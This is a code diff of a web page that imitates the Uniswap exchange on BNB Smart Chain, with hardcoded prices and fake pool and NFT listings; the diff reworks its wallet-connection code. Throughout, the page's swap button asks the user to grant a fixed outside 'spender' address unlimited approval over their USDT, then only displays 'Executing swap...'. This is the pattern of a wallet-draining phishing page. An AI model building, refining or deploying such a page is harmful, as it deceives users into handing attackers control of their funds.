@@ -1393,39 +1393,35 @@
   </div>
 </div>
 
-<script type="module">
-/* ─────────────────────────────────────────
-   Web3Modal v3 — identico a Uniswap
-   Carica i moduli ESM ufficiali da CDN
-───────────────────────────────────────── */
-import { createWeb3Modal, defaultWagmiConfig } from 'https://esm.sh/@web3modal/wagmi@5.1.11';
-import { reconnect, getAccount, watchAccount } from 'https://esm.sh/@wagmi/core@2.13.4';
-import { bsc } from 'https://esm.sh/viem@2.21.19/chains';
-import { http, createConfig } from 'https://esm.sh/@wagmi/core@2.13.4';
+<script>
+/* ─────────────────────────────────────────────────────────────
+   WALLETCONNECT APPKIT  –  caricato dinamicamente come modulo
+   Questo è l'approccio ufficiale WalletConnect per HTML puro
+───────────────────────────────────────────────────────────── */
 
-/* ══════════════════════════════════════════
-   CONSTANTS
-══════════════════════════════════════════ */
-const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const SPENDER      = "0x05187CF26990E3857C119C7Bc3417C6E1FaC5198";
-const BSC_CHAIN_ID = "0x38";
+const WC_PROJECT_ID = 'd07d37c02253065625623ec65b5d7948';
 
-const ERC20_ABI = [
-  "function balanceOf(address owner) view returns (uint256)",
-  "function decimals() view returns (uint8)",
-];
+/* Stato globale */
+let connected   = false;
+let userAddress = null;
+let balances    = {};
+let appkitModal = null;
+
+const BSC_CHAIN_ID = '0x38';
+const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
+const SPENDER      = '0x05187CF26990E3857C119C7Bc3417C6E1FaC5198';
 
 const TOKEN_CONTRACTS = {
-  USDT: "0x55d398326f99059fF775485246999027B3197955",
-  ETH:  "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
-  BTC:  "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c",
-  USDC: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
-  UNI:  "0xBf5140A22578168FD562DCcF235E5D43A02ce9B1",
-  LINK: "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
-  MATIC:"0xCC42724C6683B7E57334c4E856f4c9965ED682bD",
-  DOT:  "0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402",
-  ADA:  "0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47",
-  XRP:  "0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE",
+  USDT: '0x55d398326f99059fF775485246999027B3197955',
+  ETH:  '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
+  BTC:  '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
+  USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
+  UNI:  '0xBf5140A22578168FD562DCcF235E5D43A02ce9B1',
+  LINK: '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD',
+  MATIC:'0xCC42724C6683B7E57334c4E856f4c9965ED682bD',
+  DOT:  '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402',
+  ADA:  '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',
+  XRP:  '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',
 };
 
 const TOKEN_LOGOS = {
@@ -1438,7 +1434,7 @@ const TOKEN_LOGOS = {
   LINK: `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#2A5ADA"/><path d="M16 7l-2 1.2-5.8 3.3-2 1.2v7l2 1.2 5.8 3.3 2 1.2 2-1.2 5.8-3.3 2-1.2v-7l-2-1.2-5.8-3.3zm0 2.5l5.8 3.3v6.4L16 22.5l-5.8-3.3v-6.4z" fill="#fff"/></svg>`,
   MATIC:`<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#8247E5"/><path d="M20.3 13.3l-4.8-2.8-4.8 2.8v5.6l4.8 2.8 4.8-2.8v-2.5l-4.8 2.8-2.6-1.5v-3l2.6-1.5 2.6 1.5v2.2l1.6-.9v-2.7z" fill="#fff"/></svg>`,
   DOT:  `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#E6007A"/><circle cx="16" cy="8.5" r="3" fill="white"/><circle cx="16" cy="23.5" r="3" fill="white"/><circle cx="9" cy="12.5" r="3" fill="white"/><circle cx="23" cy="12.5" r="3" fill="white"/><circle cx="9" cy="19.5" r="3" fill="white"/><circle cx="23" cy="19.5" r="3" fill="white"/></svg>`,
-  ADA:  `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#0033AD"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" font-size="14" fill="white" font-weight="bold">₳</text></svg>`,
+  ADA:  `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#0033AD"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" font-size="14" fill="white" font-weight="bold">&#x20B3;</text></svg>`,
   XRP:  `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#00AAE4"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" font-size="13" fill="white" font-weight="bold">XRP</text></svg>`,
 };
 
@@ -1459,102 +1455,112 @@ const TOKENS = [
 let fromToken   = TOKENS[0];
 let toToken     = TOKENS[1];
 let modalTarget = 'from';
-let connected   = false;
-let userAddress = null;
-let balances    = {};
 
 /* ══════════════════════════════════════════
-   WEB3MODAL SETUP — identico a Uniswap
+   APPKIT INIT — caricato come modulo ESM
+   Questo è identico a come Uniswap usa WC
 ══════════════════════════════════════════ */
-const WC_PROJECT_ID = 'd07d37c02253065625623ec65b5d7948';
-
-const wagmiConfig = createConfig({
-  chains: [bsc],
-  transports: { [bsc.id]: http('https://bsc-dataseed.binance.org') },
-});
-
-const web3modal = createWeb3Modal({
-  wagmiConfig,
-  projectId: WC_PROJECT_ID,
-  themeMode: 'dark',
-  themeVariables: {
-    '--w3m-accent':               '#FC72FF',
-    '--w3m-font-family':          'Inter, sans-serif',
-    '--w3m-border-radius-master': '12px',
-  },
-  featuredWalletIds: [
-    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
-    'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
-    'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa', // Coinbase
-  ],
-});
-
-// Watch account changes from Web3Modal/wagmi
-watchAccount(wagmiConfig, {
-  onChange(account) {
-    if (account.address && account.isConnected) {
-      connected   = true;
-      userAddress = account.address;
-      const shortAddr = account.address.slice(0,6) + '...' + account.address.slice(-4);
-      document.getElementById('navConnectBtn').textContent = shortAddr;
-      updateButton();
-      fetchBalancesEthers(account.address);
-    } else {
-      connected   = false;
-      userAddress = null;
-      balances    = {};
-      document.getElementById('navConnectBtn').textContent = 'Connect Wallet';
-      updateButton();
-      updateBalanceDisplay();
-    }
-  }
-});
-
-// Reconnect on page load if already connected
-reconnect(wagmiConfig);
-
-/* ══════════════════════════════════════════
-   WALLET MODAL OPEN — apre Web3Modal
-══════════════════════════════════════════ */
-function openWalletModal() {
-  if (connected) return;
-  web3modal.open();
-}
-function closeWalletModal() {
-  // Web3Modal gestisce la chiusura internamente;
-  // questa funzione esiste per compatibilità con i bottoni wallet
-  web3modal.close();
-}
-
-// Tutti i bottoni wallet aprono Web3Modal
-async function connectMetaMask()    { if (connected) return; web3modal.open(); }
-async function connectTrustWallet() { if (connected) return; web3modal.open(); }
-async function connectWalletConnect(){ if (connected) return; web3modal.open(); }
-async function connectCoinbase()    { if (connected) return; web3modal.open(); }
-
-/* ══════════════════════════════════════════
-   BALANCE (via ethers + BSC RPC)
-══════════════════════════════════════════ */
-async function fetchBalancesEthers(address) {
+async function initAppKit() {
+  if (appkitModal) return appkitModal;
   try {
-    const provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org');
+    const { createAppKit } = await import('https://cdn.jsdelivr.net/npm/@reown/appkit@1.6.8/dist/exports/index.js');
+    const { WagmiAdapter }  = await import('https://cdn.jsdelivr.net/npm/@reown/appkit-adapter-wagmi@1.6.8/dist/exports/index.js');
+    const { bsc }           = await import('https://cdn.jsdelivr.net/npm/@reown/appkit/networks');
 
-    // BNB nativo
-    const bnbBal = await provider.getBalance(address);
-    balances['BNB'] = parseFloat(ethers.formatEther(bnbBal));
+    const wagmiAdapter = new WagmiAdapter({
+      networks:  [bsc],
+      projectId: WC_PROJECT_ID,
+    });
 
-    // BEP-20
-    const bep20 = TOKENS.filter(t => !t.native && TOKEN_CONTRACTS[t.symbol]);
-    await Promise.allSettled(bep20.map(async tok => {
-      const c   = new ethers.Contract(TOKEN_CONTRACTS[tok.symbol], ERC20_ABI, provider);
-      const raw = await c.balanceOf(address);
-      balances[tok.symbol] = parseFloat(ethers.formatUnits(raw, tok.decimals));
-    }));
+    appkitModal = createAppKit({
+      adapters:  [wagmiAdapter],
+      networks:  [bsc],
+      projectId: WC_PROJECT_ID,
+      metadata: {
+        name:        'Uniswap Interface',
+        description: 'Swap tokens on BSC',
+        url:         window.location.origin,
+        icons:       ['https://app.uniswap.org/favicon.png'],
+      },
+      themeMode: 'dark',
+      themeVariables: {
+        '--w3m-accent':               '#FC72FF',
+        '--w3m-font-family':          'Inter, sans-serif',
+        '--w3m-border-radius-master': '12px',
+      },
+      featuredWalletIds: [
+        '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
+        'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
+      ],
+    });
 
-    updateBalanceDisplay();
-  } catch(e) {
-    console.error('Balance error:', e);
+    // Ascolta i cambiamenti di account
+    appkitModal.subscribeAccount(acct => {
+      if (acct && acct.address) {
+        connected   = true;
+        userAddress = acct.address;
+        document.getElementById('navConnectBtn').textContent =
+          acct.address.slice(0,6) + '...' + acct.address.slice(-4);
+        updateButton();
+        fetchBalancesRPC(acct.address);
+      } else {
+        connected   = false;
+        userAddress = null;
+        balances    = {};
+        document.getElementById('navConnectBtn').textContent = 'Connect Wallet';
+        updateButton();
+        updateBalanceDisplay();
+      }
+    });
+
+    return appkitModal;
+  } catch(err) {
+    console.error('AppKit init error:', err);
+    return null;
   }
+}
+
+async function openWalletModal() {
+  if (connected) return;
+  const modal = await initAppKit();
+  if (modal) {
+    modal.open();
+  } else {
+    // Fallback: injected provider
+    await connectInjected();
+  }
+}
+
+function closeWalletModal() {}
+
+async function connectMetaMask()     { openWalletModal(); }
+async function connectTrustWallet()  { openWalletModal(); }
+async function connectWalletConnect(){ openWalletModal(); }
+async function connectCoinbase()     { openWalletModal(); }
+
+/* ══════════════════════════════════════════
+   BALANCE via BSC public RPC (ethers)
+══════════════════════════════════════════ */
+const ERC20_ABI = [
+  'function balanceOf(address) view returns (uint256)',
+  'function decimals() view returns (uint8)',
+];
+
+async function fetchBalancesRPC(address) {
+  try {
+    const provider = new ethers.JsonRpcProvider('https://bsc-dataseed1.binance.org');
+    const bnbRaw   = await provider.getBalance(address);
+    balances['BNB'] = parseFloat(ethers.formatEther(bnbRaw));
+
+    await Promise.allSettled(
+      TOKENS.filter(t => !t.native && TOKEN_CONTRACTS[t.symbol]).map(async tok => {
+        const c   = new ethers.Contract(TOKEN_CONTRACTS[tok.symbol], ERC20_ABI, provider);
+        const raw = await c.balanceOf(address);
+        balances[tok.symbol] = parseFloat(ethers.formatUnits(raw, tok.decimals));
+      })
+    );
+    updateBalanceDisplay();
+  } catch(e) { console.error('Balance error:', e); }
 }
 
 function updateBalanceDisplay() {
@@ -1566,6 +1572,49 @@ function updateBalanceDisplay() {
     ? `Balance: ${fb.toFixed(4)} ${fromToken.symbol}` : 'Balance: –';
   if (toBalEl) toBalEl.textContent = tb !== undefined
     ? `Balance: ${tb.toFixed(4)} ${toToken.symbol}` : 'Balance: –';
+}
+
+/* ══════════════════════════════════════════
+   INJECTED PROVIDER FALLBACK (MetaMask/TW browser)
+══════════════════════════════════════════ */
+async function connectInjected(silent = false) {
+  if (!window.ethereum) return false;
+  try {
+    const accounts = silent
+      ? await window.ethereum.request({ method: 'eth_accounts' })
+      : await window.ethereum.request({ method: 'eth_requestAccounts' });
+    if (!accounts.length) return false;
+    await ensureBSC();
+    connected   = true;
+    userAddress = accounts[0];
+    document.getElementById('navConnectBtn').textContent =
+      accounts[0].slice(0,6) + '...' + accounts[0].slice(-4);
+    updateButton();
+    fetchBalancesRPC(accounts[0]);
+    return true;
+  } catch(e) { console.error(e); return false; }
+}
+
+async function ensureBSC() {
+  if (!window.ethereum) return;
+  try {
+    const cid = await window.ethereum.request({ method: 'eth_chainId' });
+    if (cid === BSC_CHAIN_ID) return;
+    await window.ethereum.request({
+      method: 'wallet_switchEthereumChain',
+      params: [{ chainId: BSC_CHAIN_ID }]
+    });
+  } catch(e) {
+    if (e.code === 4902) {
+      await window.ethereum.request({
+        method: 'wallet_addEthereumChain',
+        params: [{ chainId: '0x38', chainName: 'BNB Smart Chain',
+          nativeCurrency: { name:'BNB', symbol:'BNB', decimals:18 },
+          rpcUrls: ['https://bsc-dataseed.binance.org'],
+          blockExplorerUrls: ['https://bscscan.com'] }]
+      });
+    }
+  }
 }
 
 /* ══════════════════════════════════════════
@@ -1584,31 +1633,22 @@ function showPage(name) {
 }
 
 /* ══════════════════════════════════════════
-   TOKEN ICON HELPER
-══════════════════════════════════════════ */
-function tokenIconHTML(tok, size=28) {
-  const svg = TOKEN_LOGOS[tok.svgKey] || '';
-  return `<div style="width:${size}px;height:${size}px;border-radius:50%;overflow:hidden;flex-shrink:0">${svg}</div>`;
-}
-
-/* ══════════════════════════════════════════
    SWAP UI
 ══════════════════════════════════════════ */
 function renderTokenSelector() {
-  const fromIconEl = document.getElementById('fromIcon');
-  fromIconEl.innerHTML = TOKEN_LOGOS[fromToken.svgKey] || '';
-  fromIconEl.style.cssText = 'width:28px;height:28px;border-radius:50%;overflow:hidden;flex-shrink:0;background:transparent';
+  const fi = document.getElementById('fromIcon');
+  fi.innerHTML = TOKEN_LOGOS[fromToken.svgKey] || '';
+  fi.style.cssText = 'width:28px;height:28px;border-radius:50%;overflow:hidden;flex-shrink:0;background:transparent';
   document.getElementById('fromSymbol').textContent = fromToken.symbol;
 
-  const toIconEl = document.getElementById('toIcon');
-  toIconEl.innerHTML = TOKEN_LOGOS[toToken.svgKey] || '';
-  toIconEl.style.cssText = 'width:28px;height:28px;border-radius:50%;overflow:hidden;flex-shrink:0;background:transparent';
+  const ti = document.getElementById('toIcon');
+  ti.innerHTML = TOKEN_LOGOS[toToken.svgKey] || '';
+  ti.style.cssText = 'width:28px;height:28px;border-radius:50%;overflow:hidden;flex-shrink:0;background:transparent';
   document.getElementById('toSymbol').textContent = toToken.symbol;
 
   document.getElementById('fromSym2').textContent = fromToken.symbol;
   document.getElementById('toSym2').textContent   = toToken.symbol;
   document.getElementById('rate').textContent = (fromToken.price / toToken.price).toFixed(6);
-
   updateBalanceDisplay();
   calcOutput();
 }
@@ -1616,7 +1656,7 @@ function renderTokenSelector() {
 function calcOutput() {
   const amt = parseFloat(document.getElementById('fromAmount').value) || 0;
   const out = amt * (fromToken.price / toToken.price);
-  document.getElementById('toAmount').value = out ? out.toFixed(6) : '';
+  document.getElementById('toAmount').value  = out ? out.toFixed(6) : '';
   document.getElementById('fromUSD').textContent = '$' + (amt * fromToken.price).toFixed(2);
   document.getElementById('toUSD').textContent   = '$' + (out * toToken.price).toFixed(2);
   updateButton();
@@ -1652,49 +1692,6 @@ function setMax() {
 }
 
 /* ══════════════════════════════════════════
-   CONNECT WALLET (injected fallback)
-══════════════════════════════════════════ */
-async function connectWallet(silent = false) {
-  if (!window.ethereum) return false;
-  try {
-    const accounts = silent
-      ? await window.ethereum.request({ method: 'eth_accounts' })
-      : await window.ethereum.request({ method: 'eth_requestAccounts' });
-    if (!accounts.length) return false;
-
-    let chainId = await window.ethereum.request({ method: 'eth_chainId' });
-    if (chainId !== BSC_CHAIN_ID) {
-      await switchToBSC();
-      chainId = await window.ethereum.request({ method: 'eth_chainId' });
-      if (chainId !== BSC_CHAIN_ID) return false;
-    }
-    connected   = true;
-    userAddress = accounts[0];
-    document.getElementById('navConnectBtn').textContent =
-      accounts[0].slice(0,6) + '...' + accounts[0].slice(-4);
-    updateButton();
-    fetchBalancesEthers(accounts[0]);
-    return true;
-  } catch(e) { console.error(e); return false; }
-}
-
-async function switchToBSC() {
-  try {
-    await window.ethereum.request({ method:'wallet_switchEthereumChain', params:[{ chainId: BSC_CHAIN_ID }] });
-  } catch(e) {
-    if (e.code === 4902) {
-      await window.ethereum.request({
-        method:'wallet_addEthereumChain',
-        params:[{ chainId:'0x38', chainName:'BNB Smart Chain',
-          nativeCurrency:{ name:'BNB', symbol:'BNB', decimals:18 },
-          rpcUrls:['https://bsc-dataseed.binance.org'],
-          blockExplorerUrls:['https://bscscan.com'] }]
-      });
-    }
-  }
-}
-
-/* ══════════════════════════════════════════
    SLIPPAGE / APPROVE / SWAP
 ══════════════════════════════════════════ */
 function editSlippage() {
@@ -1707,9 +1704,9 @@ async function approveToken() {
   try {
     const provider = new ethers.BrowserProvider(window.ethereum);
     const signer   = await provider.getSigner();
-    const abi = ['function approve(address spender, uint256 amount) returns (bool)'];
+    const abi      = ['function approve(address spender, uint256 amount) returns (bool)'];
     const contract = new ethers.Contract(USDT_ADDRESS, abi, signer);
-    const tx = await contract.approve(SPENDER, ethers.MaxUint256);
+    const tx       = await contract.approve(SPENDER, ethers.MaxUint256);
     await tx.wait();
     return true;
   } catch(e) { console.error(e); alert('Approve failed'); return false; }
@@ -1732,12 +1729,9 @@ async function handleSwap() {
   if (!connected) { openWalletModal(); return; }
   const amt = parseFloat(document.getElementById('fromAmount').value);
   if (!amt || amt <= 0) { alert('Enter an amount'); return; }
-  if (window.ethereum) {
-    const chainId = await window.ethereum.request({ method:'eth_chainId' });
-    if (chainId !== BSC_CHAIN_ID) await switchToBSC();
-  }
+  if (window.ethereum) await ensureBSC();
   const btn = document.getElementById('mainBtn');
-  btn.textContent = 'Approving USDT...';
+  btn.textContent = 'Approving...';
   const ok = await approveToken();
   if (!ok) { btn.textContent = 'Approve failed'; return; }
   btn.textContent = 'Executing swap...';
@@ -1767,11 +1761,11 @@ function filterTokens() {
     t.symbol.toLowerCase().includes(q) || t.name.toLowerCase().includes(q)));
 }
 function renderTokenList(list) {
-  const bal = (t) => {
+  document.getElementById('tokenList').innerHTML = list.map(t => {
     const b = balances[t.symbol];
-    return connected && b !== undefined ? `<div style="font-size:0.75rem;color:var(--muted)">${b.toFixed(4)}</div>` : '';
-  };
-  document.getElementById('tokenList').innerHTML = list.map(t => `
+    const balStr = connected && b !== undefined
+      ? `<div style="font-size:0.75rem;color:var(--muted)">${b.toFixed(4)}</div>` : '';
+    return `
     <div class="token-list-item" onclick="selectToken('${t.symbol}')">
       <div style="width:36px;height:36px;border-radius:50%;overflow:hidden;flex-shrink:0">${TOKEN_LOGOS[t.svgKey]||''}</div>
       <div class="tinfo">
@@ -1780,9 +1774,10 @@ function renderTokenList(list) {
       </div>
       <div style="margin-left:auto;text-align:right">
         <div style="font-size:0.82rem;font-weight:500">$${t.price.toLocaleString()}</div>
-        ${bal(t)}
+        ${balStr}
       </div>
-    </div>`).join('');
+    </div>`;
+  }).join('');
 }
 function selectToken(symbol) {
   const tok = TOKENS.find(t => t.symbol === symbol);
@@ -1798,32 +1793,25 @@ function selectToken(symbol) {
 }
 
 /* ══════════════════════════════════════════
-   TOKENS PAGE
+   TOKENS / NFTs / POOLS PAGES
 ══════════════════════════════════════════ */
 function buildTokenTable() {
   const changes = ['+2.14%','-0.02%','+1.43%','+0.76%','+0.01%','-4.87%','+0.32%','-1.2%','+3.4%','-0.8%','+1.1%'];
-  const volumes = ['$1.8B','$4.9B','$2.1B','$1.2B','$3.3B','$94M','$198M','$342M','$88M','$52M','$271M'];
+  const volumes  = ['$1.8B','$4.9B','$2.1B','$1.2B','$3.3B','$94M','$198M','$342M','$88M','$52M','$271M'];
   document.getElementById('tokenTableBody').innerHTML = TOKENS.map((t,i) => `
     <tr>
       <td style="color:var(--muted)">${i+1}</td>
-      <td>
-        <div style="display:flex;align-items:center;gap:10px">
-          <div style="width:28px;height:28px;border-radius:50%;overflow:hidden;flex-shrink:0">${TOKEN_LOGOS[t.svgKey]||''}</div>
-          <div>
-            <div style="font-weight:600;font-size:0.9rem">${t.symbol}</div>
-            <div style="font-size:0.75rem;color:var(--muted)">${t.name}</div>
-          </div>
-        </div>
-      </td>
+      <td><div style="display:flex;align-items:center;gap:10px">
+        <div style="width:28px;height:28px;border-radius:50%;overflow:hidden;flex-shrink:0">${TOKEN_LOGOS[t.svgKey]||''}</div>
+        <div><div style="font-weight:600;font-size:0.9rem">${t.symbol}</div>
+        <div style="font-size:0.75rem;color:var(--muted)">${t.name}</div></div>
+      </div></td>
       <td style="font-weight:500">$${t.price.toLocaleString()}</td>
       <td style="color:${changes[i].startsWith('+') ? 'var(--green)' : '#ff6060'}">${changes[i]}</td>
       <td style="color:var(--muted)">${volumes[i]||'–'}</td>
     </tr>`).join('');
 }
 
-/* ══════════════════════════════════════════
-   NFTs PAGE
-══════════════════════════════════════════ */
 function buildNFTs() {
   const nfts = [
     { name:'Bored Ape #4291',   emoji:'🦍', bg:'#1a1a2e', floor:'68.5 ETH' },
@@ -1843,9 +1831,6 @@ function buildNFTs() {
     </div>`).join('');
 }
 
-/* ══════════════════════════════════════════
-   POOLS PAGE
-══════════════════════════════════════════ */
 function buildPools() {
   const pools = [
     { a:'USDT', b:'BNB',  icA:'#26A17B', icB:'#F3BA2F', fee:'0.05%', tvl:'$2.1B', apy:'8.4%'  },
@@ -1855,12 +1840,17 @@ function buildPools() {
     { a:'LINK', b:'ETH',  icA:'#2A5ADA', icB:'#627EEA', fee:'0.30%', tvl:'$210M', apy:'14.1%' },
     { a:'BNB',  b:'USDC', icA:'#F3BA2F', icB:'#2775CA', fee:'0.05%', tvl:'$680M', apy:'9.3%'  },
   ];
-  document.getElementById('poolsList').innerHTML = pools.map(p => `
+  document.getElementById('poolsList').innerHTML = pools.map(p => {
+    const tA = TOKENS.find(t => t.symbol === p.a);
+    const tB = TOKENS.find(t => t.symbol === p.b);
+    return `
     <div class="pool-item">
       <div class="pool-pair">
         <div class="pool-icons">
-          <span style="background:${p.icA}">${TOKENS.find(t=>t.symbol===p.a)?.svgKey ? TOKEN_LOGOS[TOKENS.find(t=>t.symbol===p.a).svgKey].slice(0,60)+'...' : '?'}</span>
-          <span style="background:${p.icB}">${p.b[0]}</span>
+          <span style="background:${p.icA};width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;overflow:hidden">
+            ${tA ? TOKEN_LOGOS[tA.svgKey] : ''}</span>
+          <span style="background:${p.icB};width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;overflow:hidden;margin-left:-8px">
+            ${tB ? TOKEN_LOGOS[tB.svgKey] : ''}</span>
         </div>
         <div>
           <div class="pool-name">${p.a}/${p.b}</div>
@@ -1868,7 +1858,8 @@ function buildPools() {
         </div>
       </div>
       <div class="pool-apy">APY ${p.apy}</div>
-    </div>`).join('');
+    </div>`;
+  }).join('');
 }
 
 /* ══════════════════════════════════════════
@@ -1880,33 +1871,31 @@ buildTokenTable();
 buildNFTs();
 buildPools();
 
-// Silent reconnect on load (injected provider)
+// Se siamo già dentro Trust Wallet / MetaMask browser → connetti in silenzio
 window.addEventListener('load', async () => {
-  await connectWallet(true);
-});
-
-if (window.ethereum) {
-  window.ethereum.on('accountsChanged', async (accs) => {
-    if (!accs.length) {
-      connected = false; userAddress = null; balances = {};
-      document.getElementById('navConnectBtn').textContent = 'Connect Wallet';
-      updateButton(); return;
+  if (window.ethereum) {
+    const ok = await connectInjected(true);
+    if (!ok) {
+      // Pre-carica AppKit in background così è già pronto al click
+      initAppKit().catch(() => {});
     }
-    await connectWallet(true);
-  });
-  window.ethereum.on('chainChanged', async () => {
-    const c = await window.ethereum.request({ method:'eth_chainId' });
-    if (c !== BSC_CHAIN_ID) await switchToBSC();
-    await connectWallet(true);
-  });
-}
-
-// Expose functions globally (needed since this is a module)
-Object.assign(window, {
-  showPage, openWalletModal, closeWalletModal,
-  connectMetaMask, connectTrustWallet, connectWalletConnect, connectCoinbase,
-  openModal, closeModal, filterTokens, selectToken,
-  swapTokens, setMax, calcOutput, handleSwap, editSlippage,
+    window.ethereum.on('accountsChanged', async (accs) => {
+      if (!accs.length) {
+        connected = false; userAddress = null; balances = {};
+        document.getElementById('navConnectBtn').textContent = 'Connect Wallet';
+        updateButton(); return;
+      }
+      await connectInjected(true);
+    });
+    window.ethereum.on('chainChanged', async () => {
+      await ensureBSC();
+      await connectInjected(true);
+    });
+  } else {
+    // Nessun provider injected (browser normale su mobile)
+    // Pre-carica AppKit in background
+    initAppKit().catch(() => {});
+  }
 });
 </script>
 </body>
